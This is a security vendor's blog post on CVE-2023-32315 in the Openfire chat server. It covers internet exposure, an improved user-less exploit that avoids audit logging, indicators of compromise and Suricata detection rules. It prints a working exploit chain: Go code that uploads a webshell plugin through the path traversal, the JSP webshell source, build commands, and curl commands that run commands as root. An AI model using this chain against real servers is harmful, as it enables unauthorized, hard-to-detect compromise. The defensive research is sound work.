---
title: "Exploitation of Openfire CVE-2023-32315 - Blog - VulnCheck"
date: 2023-08-22T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Exploitation of Openfire CVE-2023-32315 - Blog - VulnCheck

<br/>

<br/>
\## Introduction\\n\\n\[CVE-2023-32315\](https://nvd.nist.gov/vuln/detail/CVE-2023-32315) is a path traversal vulnerability affecting the \[Openfire\](https://www.igniterealtime.org/projects/openfire/) admin console. Openfire is a \[well-known\](https://en.wikipedia.org/wiki/Openfire) \[open-source\](https://github.com/igniterealtime/Openfire) chat server, and according to the current maintainers, Ignite Realtime, the server software has been downloaded almost 9 million times.\\n\\nThis vulnerability has flown under the radar on the defensive side of the industry. CVE-2023-32315 has been \[exploited in the wild\](https://www.surevine.com/openfire-cve-2023-32315-what-we-know/), but you won’t find it in the CISA KEV catalog. There has also been minimal discussion about indicators of compromise and very few detections (although to their credit, Ignite Realtime put out \[patches\](https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm) and a great mitigation guide back in May).\\n\\nOn the offensive side, things have been more robust. You can find quite a few public exploits. There are some major differences between these exploits, but generally, they all follow a simple pattern: Use the path traversal to create an administrative user, log in, and then upload a plugin to achieve code execution. This process is typically manual, although \[Metasploit\](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/openfire\_auth\_bypass\_rce\_cve\_2023\_32315.rb) uploads the plugin programmatically).\\n\\nWhat’s particularly interesting about this is that creating the administrative user isn’t necessary, but it’s re-implemented over and over again. Worse, not only is it not required, but it significantly increases the amount of logging the attacker introduces.\\n\\nIn this blog, we’ll demonstrate an improved exploit for CVE-2023-32315, learn how to craft an Openfire plugin webshell, examine indicators of compromise, and share network detections.\\n\\n## Real World Impact\\n\\nTo start, we want to establish that this vulnerability is still prevalent in the wild. At the time of writing, we see approximately 6,300 servers on \[Shodan\](https://www.shodan.io/search?query=html%3A%22jive-loginVersion%22). Censys shows a \[bit\](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per\_page=25&virtual\_hosts=INCLUDE&q=services.http.response.body\_hash%3D%22sha1%3Ac44f746e0ba05d036d47e56afb7981d8bdf0a366%22) \[more\](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per\_page=25&virtual\_hosts=INCLUDE&q=services.http.response.favicons.md5\_hash%3D%22e4888ee8491b4eb75501996e41af6460%22), but it doesn’t follow the redirect to \`login.jsp\` making the queries a little more dicey.\\n\\n!\[Openfire instances on Shodan\](/blog/openfire-cve-2023-32315/shodan-openfire.png){:width="100%"}\\n\\nOpenfire exposes the installed version on the login page. To determine just how widely exploitable this vulnerability is, we did a version scan of the servers on Shodan. Openfire put out three patched versions: 4.6.8, 4.7.5, and 4.8.0. Approximately 20% of the servers had upgraded to those versions.\\n\\n> Openfire Versions Indexed by Shodan\\n\\n::pie-chart\\n---\\nlabels:\\n - Patched\\n - Too Old\\n - Forks\\n - Affected\\nvalues:\\n - 20\\n - 25\\n - 5\\n - 50\\n---\\n::\\n\\nThis doesn’t mean the remaining 80% are using affected versions. Openfire says the first affected version is 3.10.0, released in April 2015. Any version released before then is not vulnerable, and these older versions make up nearly 25% of the internet-facing Openfire servers. Of those, the most popular version is 3.7.1,released in 2011. You could assume those are mostly honeypots, but we can’t be sure.\\n\\nWe found there are a variety of Openfire forks that may or may not be vulnerable, making up about 5% of the internet-facing servers. This leaves approximately 50% of the internet-facing Openfire servers using affected versions. While that’s only a few thousand servers, it's a decent number given the server’s trusted position associated with chat clients.\\n\\n## Impacts of a User-less Exploit\\n\\nCurrent public exploits start by using the traversal to reach \`user-create.jsp\` to create an administrative user. There are quite a few exploits at this point, but as far as I can tell, the first public exploit to establish an admin user was published on June 14 as \[tangxiaofeng7/CVE-2023-32315-Openfire-Bypass\](https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass) on GitHub (at least five days after the first in-the-wild exploitation). Written in Go, the admin creation looks like this:\\n\\n\`\`\`go\\nusername := generateRandomString(6)\\npassword := generateRandomString(6)\\n\\ncreateUserUrl := fmt.Sprintf("%s/setup/setup-s/%%u002e%%u002e/%%u002e%%u002e/user-create.jsp?csrf=%s&username=%s&name=&email=&password=%s&passwordConfirm=%s&isadmin=on&create=%%E5%%88%%9B%%E5%%BB%%BA%%E7%%94%%A8%%E6%%88%%B7", t, csrf, username, password, password)\\nres, err = rawhttp.Get(createUserUrl)\\n\\nm := map\[string\]\[\]string{"Cookie": {"JSESSIONID=" + jsessionid, "csrf=" + csrf}}\\n\\nres, err = rawhttp.DoRaw("GET", createUserUrl, "", m, nil)\\nif err != nil {\\n fmt.Println(err)\\n return\\n}\\n\`\`\`\\n\\nNote that \`create=\` is followed by a bunch of URL encoded characters. They translate to 创建用户or “create user”. For detection purposes, it’s important to know this isn’t a reliable value, as OpenFire supports a variety of languages. For example, Metasploit sends this exact same admin creation request, but it’s slightly different. Here is Metasploit’s request on the wire (these requests can be POST requests, but both implementations opted for GET for whatever reason):\\n\\n\`\`\`\\nGET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=5QQN6JwEVq9LIW1&username=hqvvvarefibpfx&password=Qm7y4eZgU9&passwordConfirm=Qm7y4eZgU9&isadmin=on&create=Create%2bUser HTTP/1.1\\nHost: 10.9.49.143:9090\\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 16\_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1\\nCookie: JSESSIONID=node06x26aqm77cqelg1crrhtstts10.node0; csrf=5QQN6JwEVq9LIW1\\nContent-Type: application/x-www-form-urlencoded\\n\`\`\`\\n\\nThese exploits are creating an admin user to gain access to the Openfire Plugins interface. The plugin system allows administrators to add, more or less, arbitrary functionality to Openfire via uploaded Java JARs.\\n\\n!\[Openfire plugins page\](/blog/openfire-cve-2023-32315/openfire-plugins.png){:width="100%"}\\n\\nThis is, very obviously, a place to transition from authentication bypass to remote code execution.\\n\\nThe tangxiaofeng7 exploit repository contains an Openfire plugin with a JSP webshell. Once the attacker has created administrative credentials, they can log in, upload tangxiaofeng7’s plugin, and gain access to a webshell. Similarly, the Metasploit module’s plugin is uploaded but initiates a reverse shell instead of a webshell.\\n\\nReal-world attackers have followed this approach as well. For example, we know the Kinsing botnet likely followed this approach based on \[comments\](https://discourse.igniterealtime.org/t/cve-2023-32315-openfire-administration-console-authentication-bypass/92869/15) from the Ignite Realtime forums.\\n\\nFortunately for defenders, the admin user creation is noisy. Another user on the forum \[posted\](https://discourse.igniterealtime.org/t/cve-2023-32315-openfire-administration-console-authentication-bypass/92869/5) the Openfire security audit log after they’d been exploited (note that the audit log doesn’t disappear just because the system log file has been deleted):\\n\\n!\[Openfire security audit log after exploitation\](/blog/openfire-cve-2023-32315/security-audit-log.png){:width="100%"}\\n\\nUnfortunately for defenders, attackers don’t need to create a user or authenticate to upload a plugin. CVE-2023-32315 gives the attacker access to \`plugin-admin.jsp\`, just as it gives the attacker access to \`user-create.jsp\`. So when we wrote our exploit, we opted for a user-less approach. We extracted a \`JSESSIONID\` and CSRF token from \`/setup/setup-s/%u002e%u002e/%u002e%u002e/plugin-admin.jsp\` and then executed the following logic from our \[go-exploit\](https://github.com/vulncheck-oss/go-exploit)-based exploit:\\n\\n\`\`\`go\\nfunc uploadWebshell(conf \*config.Config, token string, session string) bool {\\n // webshell is uploaded as a multipart upload\\n var multipartFile bytes.Buffer\\n writer := multipart.NewWriter(&multipartFile)\\n header := make(textproto.MIMEHeader)\\n header.Set("Content-Disposition", \`form-data; name="uploadfile"; filename="exampleplugin.jar"\`)\\n header.Set("Content-Type", "application/x-java-archive")\\n\\n // copy the webshell into the writer\\n filedata, \_ := writer.CreatePart(header)\\n \_, \_ = io.Copy(filedata, strings.NewReader(webshell))\\n writer.Close()\\n\\n // upload it\\n headers := map\[string\]string{\\n "Cookie": fmt.Sprintf("JSESSIONID=%s;csrf=%s", session, token),\\n "Content-Type": writer.FormDataContentType(),\\n }\\n\\n // create a normal request. Go does not like the %u in their standard req, so create a\\n // normal request and then insert the malformed URI into the URL struct\\n url := protocol.GenerateURL(conf.Rhost, conf.Rport, conf.SSL, "/")\\n client, req, err := protocol.CreateRequest("POST", url, multipartFile.String(), false)\\n if err {\\n return false\\n }\\n\\n req.URL.Opaque = "/setup/setup-s/%u002e%u002e/%u002e%u002e/plugin-admin.jsp?uploadplugin&csrf=" + token\\n\\n protocol.SetRequestHeaders(req, headers)\\n resp, \_, ok := protocol.DoRequest(client, req)\\n if !ok {\\n return false\\n }\\n if resp.StatusCode != 500 {\\n output.PrintfError("Expected 500 response: %d", resp.StatusCode)\\n\\n return false\\n }\\n\\n return true\\n}\\n\`\`\`\\n\\nAs you can see, we are just uploading the plugin JAR via a POST request (and working around a bit of Go-foolishness associated with the \`%u002e\` in the URI). Without authentication, the plugin is accepted and installed. The webshell can then be accessed, without authentication, using the traversal. For example:\\n\\n\`\`\`sh\\ncurl -v "http://10.9.49.143:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/plugins/exampleplugin/exampleplugin-page.jsp?cmd=whoami"\\n\`\`\`\\n\\nThis approach keeps login attempts out of the security audit log and prevents the “uploaded plugin” notification from being recorded. That’s a pretty big deal because it leaves \*\*no evidence\*\* in the security audit log. For example, this is the security audit log for a system we exploited:\\n\\n!\[Empty Openfire security audit log after exploitation\](/blog/openfire-cve-2023-32315/empty-log.png){:width="100%"}\\n\\nAs you can see, there is absolutely nothing to indicate anything is amiss.\\n\\nThe actual openfire.log file tells a different story (depending on your installation, it may be found at \`/mnt/openfire/logs/openfire.log\`). You can find these important indicators in this log file:\\n\\n> 2023.08.18 17:19:49 \[33mWARN \[m \[Jetty-QTP-AdminConsole-39\]: org.eclipse.jetty.server.handler.ContextHandler.ROOT - Unhandled exception occurred whilst decorating page\\n> java.lang.NullPointerException: Cannot invoke "org.jivesoftware.openfire.user.User.getUsername()" because the return value of "org.jivesoftware.util.WebManager.getUser()" is null\\n\\n> 2023.08.18 17:19:49 \[33mWARN \[m \[Jetty-QTP-AdminConsole-39\]: org.eclipse.jetty.server.HttpChannel - /setup/setup-s/%u002e%u002e/%u002e%u002e/plugin-admin.jsp\\n> java.lang.NullPointerException: Cannot invoke "org.jivesoftware.openfire.user.User.getUsername()" because the return value of "org.jivesoftware.util.WebManager.getUser()" is null\\n\\n\\nUnfortunately, an attacker could use the path traversal to delete the log file. Depending on the permissions of the Openfire user, the attacker might be able to delete the log file via the webshell/reverse shell,which leaves the plugin itself as the only artifact that indicates exploitation. This is why it's important to know how one is crafted when analyzing a system that might have been exploited.\\n\\nWe were very lazy when crafting our plugin. We just used the \[Openfire example plugin\](https://github.com/igniterealtime/openfire-exampleplugin). The only modification we made was to \`/src/main/web/exampleplugin-page.jsp\` when we changed the JSP into a very simple webshell (with a weird X-Header that we’ll touch on later).\\n\\n\`\`\`java\\n<%\\nString cmd = request.getParameter("cmd");\\nif ( cmd != null) {\\n java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime().exec(cmd).getInputStream());\\n String line = in.readLine();\\n if (line != null) {\\n response.setHeader("X-Error", line);\\n }\\n} %>\\n\`\`\`\\n\\nThe real challenge was figuring out how to compile the thing (it probably should have been obvious, and we think we even came to a wrong conclusion… but it works). Our process roughly worked out to:\\n\\n\`\`\`sh\\ngit clone https://github.com/igniterealtime/openfire-exampleplugin.git\\ncd openfire-exampleplugin\\ncp ../webshell.jsp ./src/main/web/exampleplugin-page.jsp\\nmvn -B package\\ncp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar;\\n\`\`\`\\n\\n\`./target/exampleplugin.jar\` is then ready to be uploaded. It’s important to know that the plugin does not keep the webshell in its raw form. The webshell gets compiled into a class. So if you want to go hunting for the webshell, you have to dig much deeper than normal.\\n\\n!\[Openfire plugin compiled webshell in jd-gui\](/blog/openfire-cve-2023-32315/compiled-webshell.png){:width="100%"}\\n\\nOnce uploaded, the plugin looks exactly like the example plugin would. The only difference is that it has our webshell in it. \\n\\n!\[Openfire webshell plugin uploaded\](/blog/openfire-cve-2023-32315/plugin-uploaded.png){:width="100%"}\\n\\nAs previously mentioned, the attacker is free to use the webshell without authentication by using the traversal. However, using the traversal causes an exception and a stack trace to be dumped to standard out, preventing the webshell from presenting any content via the HTTP response body.\\n\\nLooking back at our webshell, you can see that we send all command output to an HTTP header. Which means even though accessing the webshell via the path traversal generates a huge error message, we can still execute and view arbitrary commands:\\n\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -v "http://10.9.49.143:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/plugins/exampleplugin/exampleplugin-page.jsp?cmd=id"\\n\* Trying 10.9.49.143:9090...\\n\* TCP\_NODELAY set\\n\* Connected to 10.9.49.143 (10.9.49.143) port 9090 (#0)\\n> GET /setup/setup-s/%u002e%u002e/%u002e%u002e/plugins/exampleplugin/exampleplugin-page.jsp?cmd=id HTTP/1.1\\n> Host: 10.9.49.143:9090\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n>\\n\* Mark bundle as not supporting multiuse\\n< HTTP/1.1 200 OK\\n< Date: Fri, 18 Aug 2023 17:20:01 GMT\\n< X-Frame-Options: SAMEORIGIN\\n< Content-Type: text/html\\n< Set-Cookie: JSESSIONID=node07guewb33cw4m1va20g1n0okxd6.node0; Path=/; HttpOnly\\n< Expires: Thu, 01 Jan 1970 00:00:00 GMT\\n< X-Error: uid=0(root) gid=0(root) groups=0(root)\\n< Content-Length: 6335\\n<\\n\`\`\`\\n\\nFrom there you can trivially pivot inward, remove the webshell, and hide within the system. All without creating the administrative user and making a mess in the log files.\\n\\n## Detections\\n\\nAny good attacker should know how to detect as well. VulnCheck is particularly interested in network-based detections. Detecting this attack on the wire isn’t too complicated, but there is some nuance.\\n\\nSuricata correctly normalizes the \`%u002e%u002e/\` as a path traversal. That sounds great, and naively a rule look the following rule can be crafted to detect all of the public exploits we’ve seen thus far:\\n\\n\`\`\`\\nalert http any any -> any any ( \\\\n msg:"VULNCHECK Openfire CVE-2023-32315 Exploit Attempt"; \\\\n flow:established,to\_server; \\\\n http.uri.raw; content:"/setup/setup-s/"; startswith; \\\\n http.uri; content:!"/setup/setup-s/"; startswith; \\\\n reference:cve,CVE-2023-32315; \\\\n classtype:web-application-attack; \\\\n sid:12701381; rev:1;)\\n\`\`\`\\n\\nThe problem is that it's really easy to bypass. For example, if the attacker just started the URI with \`/./\` then it will break the rule. Or \`/setup/./setup-s/\`. Plenty of little tricks like that. So this “good enough” rule should really be augmented with additional rules just in case someone wants to get clever:\\n\\n\`\`\`\\nalert http any any -> any any ( \\\\n msg:"VULNCHECK Openfire CVE-2023-32315 Exploit Attempt (Account)"; \\\\n flow:established,to\_server; \\\\n http.uri.raw; content:"setup"; \\\\n content:"setup-s"; distance: 1; \\\\n content:"%u002e"; distance: 1; \\\\n content:"user-create.jsp"; distance: 1; \\\\n reference:cve,CVE-2023-32315; \\\\n classtype:web-application-attack; \\\\n sid:12701382; rev:1;)\\n\`\`\`\\n\`\`\`\\nalert http any any -> any any ( \\\\n msg:"VULNCHECK Openfire CVE-2023-32315 Exploit Attempt (Plugin)"; \\\\n flow:established,to\_server; \\\\n http.uri.raw; content:"setup"; \\\\n content:"setup-s"; distance: 1; \\\\n content:"%u002e"; distance: 1; \\\\n content:"plugin-admin.jsp"; distance: 1; \\\\n reference:cve,CVE-2023-32315; \\\\n classtype:web-application-attack; \\\\n sid:12701383; rev:1;)\\n\`\`\`\\n\\nDetection after exploitation is much more challenging since the attack, if done correctly, can entirely avoid the security audit log. The next best source of truth is any new/unexpected plugins on the system. Generally, however, someone will need to look at that with a Java decompiler, which isn’t useful for a layperson.\\n\\nThe final source to examine is probably the \`openfire.log\` file (which might get deleted). The telltale indication of exploitation in the log file will be long stack traces associated with:\\n\\n\\n> "org.jivesoftware.openfire.user.User.getUsername()" because the return value of "org.jivesoftware.util.WebManager.getUser()" is null\\n\\n\\n## Summary\\n\\nIn this blog, we demonstrated a new way to exploit CVE-2023-32315. This method avoids creating an admin user and bypasses some important security logging. Given that, we identified potential areas to identify compromise (JAR file, \`openfire.log\`) and provided a general outline of what indicators to look for.\\n\\nThis vulnerability has already been exploited in the wild, likely even by a well-known botnet. With plenty of vulnerable internet-facing systems, we assume exploitation will continue into the future.\\n\\n\\n## Learn More\\n\\nIf you are as interested in exploits as we are, register for a VulnCheck account today by clicking “Sign in / Join Community and schedule a demo to learn more.\\n

#### [Source](https://vulncheck.com/blog/openfire-cve-2023-32315)

<br/>
---
